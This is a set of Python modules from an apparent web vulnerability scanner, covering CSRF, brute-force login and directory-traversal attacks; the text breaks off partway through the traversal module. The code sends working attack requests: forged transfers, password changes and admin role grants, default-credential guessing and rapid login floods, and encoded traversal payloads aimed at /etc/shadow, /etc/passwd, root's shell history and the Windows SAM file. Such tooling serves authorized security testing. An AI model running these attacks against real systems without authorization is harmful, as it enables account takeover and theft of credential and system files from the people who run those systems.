# backend/attacks/csrf.py
import aiohttp
import asyncio
import urllib.parse
import re
from typing import List, Dict, Any
from dataclasses import dataclass
import logging

logger = logging.getLogger(__name__)

@dataclass
class Vulnerability:
    type: str
    severity: str
    parameter: str
    payload: str
    evidence: str
    description: str

class CSRFAttack:
    def __init__(self):
        self.test_forms = [
            {'action': '/transfer', 'method': 'POST', 'fields': {'amount': '1000', 'to_account': '12345'}},
            {'action': '/delete_user', 'method': 'POST', 'fields': {'user_id': '1'}},
            {'action': '/change_password', 'method': 'POST', 'fields': {'new_password': 'hacked123'}},
            {'action': '/update_profile', 'method': 'POST', 'fields': {'email': 'hacker@evil.com'}},
            {'action': '/admin/settings', 'method': 'POST', 'fields': {'role': 'admin'}}
        ]

    async def execute(self, target_url: str, parameters: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Execute CSRF attack against target URL"""
        vulnerabilities = []
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
                # Test for missing CSRF tokens
                csrf_vulns = await self._test_csrf_protection(session, target_url)
                vulnerabilities.extend(csrf_vulns)
                
                # Test SameSite cookie protection
                samesite_vulns = await self._test_samesite_protection(session, target_url)
                vulnerabilities.extend(samesite_vulns)
                
        except Exception as e:
            logger.error(f"CSRF attack failed: {str(e)}")
            
        return [vuln.__dict__ if hasattr(vuln, '__dict__') else vuln for vuln in vulnerabilities]

    async def _test_csrf_protection(self, session: aiohttp.ClientSession, target_url: str) -> List[Vulnerability]:
        """Test for CSRF token protection"""
        vulnerabilities = []
        
        try:
            # First, try to get the form page to check for CSRF tokens
            async with session.get(target_url) as response:
                form_html = await response.text()
                
            # Check if CSRF tokens are present
            csrf_patterns = [
                r'<input[^>]*name=["\']_token["\'][^>]*>',
                r'<input[^>]*name=["\']csrf_token["\'][^>]*>',
                r'<input[^>]*name=["\']authenticity_token["\'][^>]*>',
                r'<meta[^>]*name=["\']csrf-token["\'][^>]*>',
            ]
            
            has_csrf_token = any(re.search(pattern, form_html, re.IGNORECASE) for pattern in csrf_patterns)
            
            # Test each form action
            for form_data in self.test_forms:
                test_url = urllib.parse.urljoin(target_url, form_data['action'])
                
                # Try to submit form without CSRF token
                vulnerability = await self._test_form_submission(
                    session, test_url, form_data['fields'], has_csrf_token
                )
                
                if vulnerability:
                    vulnerabilities.append(vulnerability)
                    
        except Exception as e:
            logger.error(f"CSRF token testing failed: {str(e)}")
            
        return vulnerabilities

    async def _test_form_submission(
        self, 
        session: aiohttp.ClientSession, 
        url: str, 
        form_fields: Dict[str, str],
        has_csrf_token: bool
    ) -> Vulnerability:
        """Test form submission for CSRF vulnerability"""
        
        try:
            # Submit form without CSRF token
            async with session.post(url, data=form_fields) as response:
                response_text = await response.text()
                status_code = response.status
                
            # Analyze response for CSRF vulnerability indicators
            if self._is_csrf_vulnerable(response_text, status_code, has_csrf_token):
                return Vulnerability(
                    type="Cross-Site Request Forgery (CSRF)",
                    severity="high",
                    parameter="CSRF Token",
                    payload=f"POST {url} with data: {form_fields}",
                    evidence=f"Form submission successful without CSRF token (Status: {status_code})",
                    description="CSRF vulnerability detected. The application accepts state-changing requests without proper CSRF token validation, allowing attackers to perform unauthorized actions on behalf of authenticated users."
                )
                
        except Exception as e:
            logger.debug(f"Form submission test failed: {str(e)}")
            
        return None

    def _is_csrf_vulnerable(self, response_text: str, status_code: int, has_csrf_token: bool) -> bool:
        """Determine if the response indicates CSRF vulnerability"""
        
        # If the request was successful (2xx status), it might be vulnerable
        if 200 <= status_code < 300:
            # Check for success indicators in response
            success_indicators = [
                'success', 'updated', 'deleted', 'transferred', 'changed',
                'profile updated', 'password changed', 'user deleted'
            ]
            
            response_lower = response_text.lower()
            if any(indicator in response_lower for indicator in success_indicators):
                return True
        
        # Check for absence of CSRF error messages
        csrf_error_patterns = [
            'csrf token', 'invalid token', 'token mismatch', 'forbidden',
            'cross-site request forgery', 'security token'
        ]
        
        response_lower = response_text.lower()
        has_csrf_error = any(pattern in response_lower for pattern in csrf_error_patterns)
        
        return not has_csrf_error and status_code != 403

    async def _test_samesite_protection(self, session: aiohttp.ClientSession, target_url: str) -> List[Vulnerability]:
        """Test SameSite cookie protection"""
        vulnerabilities = []
        
        try:
            # Make request to check cookie headers
            async with session.get(target_url) as response:
                cookies = response.cookies
                
            # Check each cookie for SameSite attribute
            for cookie in cookies.values():
                cookie_header = str(cookie)
                
                if 'samesite' not in cookie_header.lower():
                    vulnerabilities.append(Vulnerability(
                        type="Cross-Site Request Forgery (CSRF)",
                        severity="medium",
                        parameter="SameSite Cookie",
                        payload=f"Cookie: {cookie.key}",
                        evidence="Cookie missing SameSite attribute",
                        description="Missing SameSite cookie attribute. Cookies without SameSite protection can be sent in cross-site requests, potentially enabling CSRF attacks."
                    ))
                elif 'samesite=none' in cookie_header.lower():
                    vulnerabilities.append(Vulnerability(
                        type="Cross-Site Request Forgery (CSRF)",
                        severity="low",
                        parameter="SameSite Cookie",
                        payload=f"Cookie: {cookie.key}",
                        evidence="Cookie has SameSite=None",
                        description="Cookie configured with SameSite=None. While this may be intentional for cross-site functionality, it reduces CSRF protection."
                    ))
                    
        except Exception as e:
            logger.error(f"SameSite cookie testing failed: {str(e)}")
            
        return vulnerabilities

# backend/attacks/brute_force.py
import aiohttp
import asyncio
from typing import List, Dict, Any
from dataclasses import dataclass
import itertools
import time
import logging

logger = logging.getLogger(__name__)

@dataclass
class Vulnerability:
    type: str
    severity: str
    parameter: str
    payload: str
    evidence: str
    description: str

class BruteForceAttack:
    def __init__(self):
        self.common_passwords = [
            'password', '123456', 'password123', 'admin', 'letmein',
            'welcome', 'monkey', '1234567890', 'qwerty', 'abc123',
            'Password1', 'password1', '123456789', 'welcome123',
            'admin123', 'root', 'toor', 'pass', 'test', 'guest'
        ]
        
        self.common_usernames = [
            'admin', 'administrator', 'root', 'user', 'test',
            'guest', 'demo', 'sa', 'oracle', 'postgres',
            'mysql', 'web', 'www', 'ftp', 'mail'
        ]

    async def execute(self, target_url: str, parameters: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Execute brute force attack against login endpoints"""
        vulnerabilities = []
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
                # Test for account lockout policies
                lockout_vulns = await self._test_account_lockout(session, target_url)
                vulnerabilities.extend(lockout_vulns)
                
                # Test common credentials
                cred_vulns = await self._test_common_credentials(session, target_url)
                vulnerabilities.extend(cred_vulns)
                
                # Test rate limiting
                rate_limit_vulns = await self._test_rate_limiting(session, target_url)
                vulnerabilities.extend(rate_limit_vulns)
                
        except Exception as e:
            logger.error(f"Brute force attack failed: {str(e)}")
            
        return [vuln.__dict__ if hasattr(vuln, '__dict__') else vuln for vuln in vulnerabilities]

    async def _test_account_lockout(self, session: aiohttp.ClientSession, target_url: str) -> List[Vulnerability]:
        """Test for account lockout mechanisms"""
        vulnerabilities = []
        
        try:
            test_username = "testuser"
            failed_attempts = 0
            max_attempts = 10
            
            for i in range(max_attempts):
                login_data = {
                    'username': test_username,
                    'password': f'wrongpassword{i}'
                }
                
                start_time = time.time()
                async with session.post(target_url, data=login_data) as response:
                    response_text = await response.text()
                    response_time = time.time() - start_time
                
                if self._is_login_failed(response_text, response.status):
                    failed_attempts += 1
                    
                    # Check if account is locked
                    if 'locked' in response_text.lower() or 'blocked' in response_text.lower():
                        break
                else:
                    # Unexpected success - might be a vulnerability
                    break
                    
                await asyncio.sleep(0.5)  # Small delay between attempts
            
            # If we made many failed attempts without lockout
            if failed_attempts >= 5:
                vulnerabilities.append(Vulnerability(
                    type="Brute Force",
                    severity="medium",
                    parameter="Account Lockout",
                    payload=f"Multiple failed login attempts for {test_username}",
                    evidence=f"No account lockout after {failed_attempts} failed attempts",
                    description="Missing or insufficient account lockout policy. The application allows unlimited failed login attempts, making it vulnerable to brute force attacks."
                ))
                
        except Exception as e:
            logger.error(f"Account lockout testing failed: {str(e)}")
            
        return vulnerabilities

    async def _test_common_credentials(self, session: aiohttp.ClientSession, target_url: str) -> List[Vulnerability]:
        """Test common username/password combinations"""
        vulnerabilities = []
        
        try:
            # Test a subset of common combinations
            test_combinations = list(itertools.product(
                self.common_usernames[:5], 
                self.common_passwords[:5]
            ))
            
            successful_logins = []
            
            for username, password in test_combinations:
                login_data = {
                    'username': username,
                    'password': password
                }
                
                try:
                    async with session.post(target_url, data=login_data) as response:
                        response_text = await response.text()
                        
                        if self._is_login_successful(response_text, response.status):
                            successful_logins.append((username, password))
                            
                except Exception as e:
                    logger.debug(f"Login attempt failed for {username}:{password} - {str(e)}")
                    continue
                
                await asyncio.sleep(0.2)  # Rate limiting
            
            # Report successful logins as vulnerabilities
            for username, password in successful_logins:
                vulnerabilities.append(Vulnerability(
                    type="Brute Force",
                    severity="critical",
                    parameter="Weak Credentials",
                    payload=f"{username}:{password}",
                    evidence=f"Successful login with common credentials",
                    description=f"Weak default credentials detected. The account '{username}' uses the common password '{password}', making it vulnerable to brute force attacks."
                ))
                
        except Exception as e:
            logger.error(f"Common credentials testing failed: {str(e)}")
            
        return vulnerabilities

    async def _test_rate_limiting(self, session: aiohttp.ClientSession, target_url: str) -> List[Vulnerability]:
        """Test for rate limiting mechanisms"""
        vulnerabilities = []
        
        try:
            rapid_requests = 20
            responses = []
            
            # Send rapid requests
            tasks = []
            for i in range(rapid_requests):
                task = self._make_login_request(
                    session, 
                    target_url, 
                    {'username': f'test{i}', 'password': 'password'}
                )
                tasks.append(task)
            
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Analyze responses for rate limiting
            successful_responses = [r for r in responses if not isinstance(r, Exception)]
            
            if len(successful_responses) >= rapid_requests * 0.8:  # 80% success rate
                vulnerabilities.append(Vulnerability(
                    type="Brute Force",
                    severity="medium",
                    parameter="Rate Limiting",
                    payload=f"Rapid fire {rapid_requests} requests",
                    evidence=f"{len(successful_responses)} out of {rapid_requests} requests succeeded",
                    description="Missing or insufficient rate limiting. The application allows rapid successive login attempts, facilitating brute force attacks."
                ))
                
        except Exception as e:
            logger.error(f"Rate limiting testing failed: {str(e)}")
            
        return vulnerabilities

    async def _make_login_request(self, session: aiohttp.ClientSession, url: str, data: Dict[str, str]):
        """Make a single login request"""
        try:
            async with session.post(url, data=data) as response:
                return {'status': response.status, 'text': await response.text()}
        except Exception as e:
            return e

    def _is_login_successful(self, response_text: str, status_code: int) -> bool:
        """Determine if login was successful"""
        
        success_indicators = [
            'welcome', 'dashboard', 'profile', 'logout', 'successful',
            'logged in', 'authentication successful'
        ]
        
        failure_indicators = [
            'invalid', 'incorrect', 'failed', 'error', 'denied',
            'login failed', 'authentication failed'
        ]
        
        response_lower = response_text.lower()
        
        # Check for redirect (common for successful logins)
        if status_code in [301, 302, 303, 307, 308]:
            return True
        
        # Check for success indicators
        if any(indicator in response_lower for indicator in success_indicators):
            return True
        
        # Check for explicit failure indicators
        if any(indicator in response_lower for indicator in failure_indicators):
            return False
        
        # Default: assume failure for login attempts
        return False

    def _is_login_failed(self, response_text: str, status_code: int) -> bool:
        """Determine if login failed"""
        return not self._is_login_successful(response_text, status_code)

# backend/attacks/directory_traversal.py
import aiohttp
import asyncio
import urllib.parse
import os
from typing import List, Dict, Any
from dataclasses import dataclass
import logging

logger = logging.getLogger(__name__)

@dataclass
class Vulnerability:
    type: str
    severity: str
    parameter: str
    payload: str
    evidence: str
    description: str

class DirectoryTraversalAttack:
    def __init__(self):
        self.payloads = [
            # Basic path traversal
            "../",
            "..\\",
            "../../",
            "..\\..\\",
            "../../../",
            "..\\..\\..\\",
            "../../../../",
            "..\\..\\..\\..\\",
            
            # URL encoded
            "%2e%2e%2f",
            "%2e%2e%5c",
            "%2e%2e/%2e%2e/",
            "%2e%2e\\%2e%2e\\",
            
            # Double URL encoded
            "%252e%252e%252f",
            "%252e%252e%255c",
            
            # Unix-specific paths
            "../../../etc/passwd",
            "../../../../etc/shadow",
            "../../../etc/hosts",
            "../../../../proc/version",
            "../../../etc/issue",
            "../../../../root/.bash_history",
            
            # Windows-specific paths
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "..\\..\\..\\boot.ini",
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\windows\\system.ini",
            
            # Null byte injection
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            "..\\..\\..\\boot.ini%00.txt",
            
            # Mixed encodings
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e\\%2e%2e\\%2e%2e\\windows\\system32\\drivers\\etc\\hosts",
            
            # Bypass attempts
            "....//....//....//etc/passwd",
            "....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts",
            ".%2e/.%2e/.%2e/etc/passwd",
        ]
        
        # Sensitive files to target
        self.target_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/proc/version",
            "/etc/issue",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\boot.ini",
            "C:\\windows\\win.ini",
            "C:\\windows\\system.ini"
        ]

    async def execute(self, target_url: str, parameters: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Execute directory traversal attack"""
        vulnerabilities = []
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
                # Test GET parameters
                get_vulns = await self._test_get_parameters(session, target_url)
                vulnerabilities.extend(get_vulns)
                
                # Test POST parameters
                post_vulns = await self._test_post_parameters(session, target_url, parameters)
                vulnerabilities.extend(post_vulns)
                
                # Test common file parameters
                file_vulns = await self._test_file_parameters(session, target_url)
                vulnerabilities.extend(file_vulns)
                
        except Exception as e:
            logger.error(f"Directory traversal attack failed: {str(e)}")
            
        return [vuln.__dict__ if hasattr(vuln, '__dict__') else vuln for vuln in vulnerabilities]

    async def _test_get_parameters(self, session: aiohttp.ClientSession, target_url: str) -> List[Vulnerability]:
        """Test GET parameters for directory traversal"""
        vulnerabilities = []
        
        try:
            parsed_url = urllib.parse.urlparse(target_url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            # If no parameters, try common file parameter names
            if not query_params:
                query_params = {
                    'file': ['test.txt'],
                    'page': ['home'],
                    'include': ['header'],
                    'template': ['main'],
                    'doc': ['readme']
                }
            
            for param_name, param_values in query_params.items():
                for payload in self.payloads:
                    modified_params = query_params.copy()
                    modified_params[param_name] = [payload]
                    
                    new_query = urllib.parse.urlencode(modified_params, doseq=True)
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                    
                    vulnerability = await self._send_payload_request(
                        session, test_url, "GET", param_name, payload
                    )
                    
                    if vulnerability:
                        vulnerabilities.append(vulnerability)
                        
        except Exception as e:
            logger.error(f"GET parameter traversal testing failed: {str(e)}")
            
        return vulnerabilities

    async def _test_post_parameters(self, session: aiohttp.ClientSession, target_url: str, parameters: Dict[str, Any]) -> List[Vulnerability]:
        """Test POST parameters for directory traversal"""
        vulnerabilities = []
        
        if not parameters:
            parameters = {
                'file': 'test.txt',
                'document': 'readme.txt',
                'include': 'header.php',
                'template': 'main.html'
            }
        
        try:
            for param_name, original_value in parameters.items():
                for payload in self.payloads:
                    modified_params = parameters.copy()
                    modified_params[param_name] = payload
                    
                    vulnerability = await self._send_payload_request(
                        session, target_url, "POST", param_name, payload, data=modified_params
                    )
                    
                    if vulnerability:
                        vulnerabilities.append(vulnerability)
                        
        except Exception as e:
            logger.error(f"POST parameter traversal testing failed: {str(e)}")
            
        return vulnerabilities

    async def _test_file_parameters(self, session: aiohttp.ClientSession, target_url: str) -> List[Vulnerability]:
        """Test common file access endpoints"""
        vulnerabilities = []
        
        # Common file access patterns
        file_endpoints = [
            '/file',
            '/download',
            '/view',
            '/read',
            '/include',
            '/load'
        ]
        
        file_params = ['file', 'filename', 'path', 'doc', 'page']
        
        try:
            parsed_url = urllib.parse.urlparse(target_url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            for endpoint in file_endpoints:
                for param in file_params:
                    for payload in self.payloads[:10]:  # Test subset
                        test_url = f"{base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
                        
                        vulnerability = await self._send_payload_request(
                            session, test_url, "GET", param, payload
                        )
                        
                        if vulnerability:
                            vulnerabilities.append(vulnerability)
                            
        except Exception as e:
            logger.error(f"File parameter testing failed: {str(e)}")
            
        return vulnerabilities

    async def _send_payload_request(
        self, 
        session: aiohttp.ClientSession, 
        url: str, 
        method: str, 
        param_name: str, 
        payload: str,
        data: Dict = None
    ) -> Vulnerability:
        """Send request with directory traversal payload"""
        
        try:
            if method == "GET":
                async with session.get(url) as response:
                    response_text = await response.text()
                    status_code = response.status
            else:
                async with session.post(url, data=data) as response:
                    response_text = await response.text()
                    status_code = response.status
                    
            vulnerability = self._analyze_response(
                response_text, status_code, param_name, payload
            )
            
            return vulnerability
            
        except Exception as e:
            logger.debug(f"Directory traversal request failed: {str(e)}")
            return None

    def _analyze_response(self, response_text: str, status_code: int, param_name: str, payload: str) -> Vulnerability:
        """Analyze response for directory traversal indicators"""
        
        # Unix system file indicators
        unix_indicators = [
            'root:x:0:0:root',  # /etc/passwd
            'daemon:x:1:1:daemon',
            'bin:x:2:2:bin',
            'root:',
            'nobody:',
            'www-data:',
            'apache:',
            'nginx:',
            '# /etc/hosts',
            'localhost',
            '127.0.0.1',
            'Linux version',
            'kernel version'
        ]
        
        # Windows system file indicators